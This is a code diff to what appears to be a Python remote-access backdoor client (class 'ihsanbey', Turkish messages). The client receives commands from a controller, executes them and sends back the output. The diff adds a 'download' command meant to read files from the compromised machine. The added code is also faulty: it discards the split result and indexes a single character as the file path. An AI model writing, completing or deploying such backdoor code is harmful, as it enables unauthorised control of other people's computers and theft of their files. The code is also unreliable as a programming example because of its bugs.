@@ -45,6 +45,11 @@ class ihsanbey:
             return ("Beklenmedik bir hata oluştu: " + str(e)).encode('utf-8')
 
 
+    def read_file(self, path):
+        with open(path, "rb+") as file:
+            return file.read()
+            
+
     def run(self):
         while True:
             command = self.reliable_recieve()
@@ -60,6 +65,10 @@ class ihsanbey:
                     self.reliable_send(command_result)
                 except FileNotFoundError:
                     return print("Eksik dosya ismi / dosya bulunamadı")
+            elif command.startswith("download "):
+                command.split(" ")
+                command_result = self.read_file(command[1])
+                print(command_result)
             else:
                 try:    
                     resultt = self.execute_command(command.encode("utf-8"))
